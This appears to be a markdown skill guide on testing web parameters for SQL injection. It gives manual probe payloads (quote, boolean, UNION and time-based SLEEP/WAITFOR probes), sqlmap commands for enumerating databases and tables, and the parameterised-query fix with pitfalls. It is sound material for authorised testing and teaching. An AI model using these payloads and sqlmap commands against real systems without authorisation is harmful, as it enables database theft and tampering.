---
name: sql-injection-testing
domain: 03-web-application-security
description: Use when checking whether a web parameter reaches a database unsafely — covers manual confirmation, sqlmap, and the parametrised-query fix.
difficulty: intermediate
tags: [owasp, injection, sqli, database, web]
tools: [burp, sqlmap, curl]
---

## Purpose

SQL injection is what happens when user input is concatenated into a query instead of bound as a parameter. Confirmed, it usually means reading (and often writing) the whole database, and sometimes command execution on the DB host. This skill covers finding it, confirming it without wrecking data, and closing it properly.

## When to use it

Any input that could plausibly reach a database: search boxes, filters, sort parameters, IDs in the path or query string, JSON fields, cookies, headers the app trusts. It's the first thing to check on any endpoint that returns data that looks like it came from a table.

## Procedure

1. Map the injectable inputs. Anything the app echoes back or filters on is a candidate — including values you'd assume are server-controlled, like a hidden `sort` field.
2. Send a single quote and watch for a database error or a change in behaviour:
   ```
   curl "https://app.tld/item?id=1'"
   ```
   A SQL error, a 500, or a differently-shaped page all point at injection.
3. Confirm with boolean logic rather than errors — more reliable, works even when errors are hidden. These two should return different results if the parameter is injectable:
   ```
   id=1 AND 1=1     -> normal page
   id=1 AND 1=2     -> empty / different page
   ```
4. If the app gives no visible difference, test for time-based blind injection. A deliberate delay that only fires on the true branch confirms it:
   ```
   id=1 AND SLEEP(5)     (MySQL)
   id=1; WAITFOR DELAY '0:0:5'--   (MSSQL)
   ```
5. Once confirmed manually, let sqlmap do the extraction so you're not hand-crafting UNION queries. Point it at a saved request from your proxy:
   ```
   sqlmap -r request.txt --batch --level 3 --risk 2
   ```
6. Enumerate conservatively — current DB and user first, then tables, then only the columns you need to prove impact. Don't dump customer data you don't need for the report:
   ```
   sqlmap -r request.txt --current-db --current-user
   sqlmap -r request.txt -D appdb --tables
   ```

## Cheatsheet

```bash
# quick manual probes
id=1'
id=1' OR '1'='1
id=1 AND 1=1     /     id=1 AND 1=2
id=1 UNION SELECT NULL,NULL,version()--
id=1 AND SLEEP(5)

# sqlmap from a proxied request (preferred — carries headers/cookies)
sqlmap -r request.txt --batch

# sqlmap straight at a URL, POST body, specific param
sqlmap -u "https://app.tld/item?id=1" -p id --batch
sqlmap -u "https://app.tld/login" --data "user=a&pass=b" -p user

# through an authenticated session
sqlmap -r request.txt --cookie "session=..." --batch
```

## Reading the output

- A **database error message** in the response is near-certain injection — and its own information leak.
- A **consistent boolean difference** (`1=1` vs `1=2`) is a solid confirmation even with errors suppressed.
- A **reliable time delay** that tracks your `SLEEP` value confirms blind injection; a one-off delay might just be a slow server, so repeat it.
- sqlmap reporting the parameter as injectable with a named technique (boolean-based, time-based, UNION, error-based) is your confirmation for the report — quote which technique.

## The fix

Injection exists because data and code got mixed in the same string. Separate them with **parameterised queries / prepared statements** — the input becomes a bound value the database never parses as SQL:

```java
// vulnerable
String q = "SELECT * FROM items WHERE id = " + id;

// fixed — id is bound, never concatenated
PreparedStatement ps = conn.prepareStatement(
    "SELECT * FROM items WHERE id = ?");
ps.setInt(1, Integer.parseInt(id));
```

Same idea in every stack: `?`/named placeholders, or a query builder/ORM that parameterises for you. Supporting layers, not replacements: validate input against an allowlist (especially for things that can't be bound, like a column name in `ORDER BY`), run the app's DB account with least privilege, and keep detailed SQL errors out of responses. None of those substitute for binding the parameter.

## Pitfalls

- **Testing on production data.** `OR 1=1` in an UPDATE or DELETE context can modify rows. Confirm read-only first, and prefer a staging copy.
- **Blind injection dismissed as "not exploitable."** No visible output doesn't mean no impact — time-based extraction gets the same data, slower.
- **WAF false comfort.** A blocked `'` doesn't mean the bug is fixed, only hidden. The vulnerable query is still there behind the filter.
- **Relying on client-side or ORM "safety."** ORMs still let you concatenate raw SQL. An ORM in the stack is not proof the endpoint is safe.

## References

- OWASP WSTG-INPV-05 (Testing for SQL Injection)
- OWASP SQL Injection Prevention Cheat Sheet
- CWE-89
- sqlmap user manual (github.com/sqlmapproject/sqlmap)
